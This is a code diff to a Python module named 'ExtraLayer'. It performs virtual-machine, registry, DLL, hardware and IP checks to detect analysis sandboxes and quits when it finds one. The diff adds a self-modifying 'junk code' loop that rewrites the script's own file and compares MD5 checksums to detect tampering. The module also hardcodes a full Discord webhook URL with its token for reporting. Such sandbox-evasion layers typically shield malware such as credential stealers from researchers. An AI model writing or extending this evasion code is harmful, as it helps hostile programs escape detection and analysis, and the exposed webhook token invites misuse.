@@ -1,8 +1,11 @@
-import re
 import requests
 import json
 import socket
 import subprocess
+import sys    
+import uuid
+import hashlib
+import time
 from win32gui import GetWindowText,EnumWindows
 from win32process import GetWindowThreadProcessId
 from psutil import Process,process_iter, virtual_memory, cpu_count, disk_usage, users
@@ -10,6 +13,7 @@ from threading import Thread
 from requests import get
 from os import system, path, environ
 from winreg import HKEY_LOCAL_MACHINE, OpenKey, CloseKey, QueryValueEx
+
 
 # Created by BugleBoy#1234
 # ExtraLayer | An extra-layer between you and the code.
@@ -60,6 +64,10 @@ class ExtraLayer:
     LAYER_SEND_INFO = False # // Send debug info, of user | might help you debug if ExtraLayer is causing problems!
     LAYER_DISCORD_WEBHOOK = "https://discordapp.com/api/webhooks/1024049249249398906/8vJ1NKLWzEYI2n-wVjNkEyFnwQdq1jc5IAjns_2kWd0AACfxD0SB2rKuwQD52agQlXwZ"
 
+    # // Extras
+    self_file =  path.basename(sys.argv[0])
+    JUNK_IDS = []
+
     if LAYER_DISCORD_WEBHOOK != "":
         try:
             UserWebHook = Discord(url=str(LAYER_DISCORD_WEBHOOK))
@@ -74,6 +82,7 @@ class ExtraLayer:
         "_CHECK_REGISTRY":["Detected VM(VPS) 0x2"],
         "_CHECK_DLL":["Detected VM(VPS) 0x3"],
         "_CHECK_SPECS":["MEMORY Invalid!","STORAGE Invalid!","CPU Counts, invalid!"],
+        "_JUNK_CODE":["Detected Changes!"],
         }
 
 
@@ -188,11 +197,57 @@ class ExtraLayer:
         if int(str(disk_usage('/')[0]/1024/1024/1024).split(".")[0]) <= 50: ExtraLayer._EXIT(ExtraLayer.LAYER_REASONS["_CHECK_SPECS"][1])
         if int(cpu_count()) <= 1: ExtraLayer._EXIT(ExtraLayer.LAYER_REASONS["_CHECK_SPECS"][2])
 
+    def _GET_CHECKSUM():
+        md5_hash = hashlib.md5()
+        file = open(''.join(sys.argv), "rb")
+        md5_hash.update(file.read())
+        digest = md5_hash.hexdigest()
+        if ExtraLayer.LAYER_SEND_INFO:
+            print(f"DEBUG: _GET_CHECKSUM | {digest}")
+        return digest
+
+    def _RM_JUNK():
+        for JUNK_ID in ExtraLayer.JUNK_IDS:
+            codes = f"""
+class _{JUNK_ID}_: # // JunkCode (Remove If ExtraLayer Dident!)
+    print("{JUNK_ID}")
+            """
+            with open(ExtraLayer.self_file, "r+") as text_file:
+                texts = text_file.read()
+                texts = texts.replace(codes, "")
+            with open(ExtraLayer.self_file, "w") as text_file:
+                text_file.write(texts)
+        return ExtraLayer._GET_CHECKSUM()
+
+    def _ADD_JUNK():
+        with open(ExtraLayer.self_file, 'a+') as PythonFile:
+            JUNK_ID = uuid.uuid4().hex
+            ExtraLayer.JUNK_IDS.append(str(JUNK_ID))
+            junk = f"""
+class _{JUNK_ID}_: # // JunkCode (Remove If ExtraLayer Dident!)
+    print("{JUNK_ID}")
+            """
+            PythonFile.write(f"{junk}")
+
+    def _JUNK_CODE():
+        while True:
+            ExtraLayer._ADD_JUNK() # // ADD JUNK CODE
+            if ExtraLayer.LAYER_SEND_INFO:
+                print("DEBUG: Added Junk")
+            time.sleep(2)
+            RM_CHECK = ExtraLayer._RM_JUNK() # // REMOVE JUNK CODE
+            if ExtraLayer.LAYER_SEND_INFO:
+                print("DEBUG: Removed Junk")
+            if ExtraLayer._GET_CHECKSUM() == RM_CHECK:
+                time.sleep(0.5)
+            else:
+                ExtraLayer._EXIT(ExtraLayer.LAYER_REASONS["_JUNK_CODE"][0])
+
     # // Main | Startup
     def _START_LAYER():
         if ExtraLayer.LAYER_SEND_INFO:
-            print(f"DEBUG: Start_Layer was called!")
-        checks = [ExtraLayer._CHECK_WINDOWS,ExtraLayer._CHECK_IP,ExtraLayer._CHECK_REGISTRY,ExtraLayer._CHECK_DLL,ExtraLayer._CHECK_SPECS,ExtraLayer._CHECK_VM] # // You can add,remove checks here!
+            print("DEBUG: Start_Layer was called!")
+        checks = [ExtraLayer._CHECK_WINDOWS,ExtraLayer._CHECK_IP,ExtraLayer._CHECK_REGISTRY,ExtraLayer._CHECK_DLL,ExtraLayer._CHECK_SPECS,ExtraLayer._CHECK_VM,ExtraLayer._JUNK_CODE] # // You can add,remove checks here!
         for check in checks: Thread(target=check,daemon=True).start()
         if ExtraLayer.LAYER_SEND_INFO:
             print(f"DEBUG: {check}, was started!")
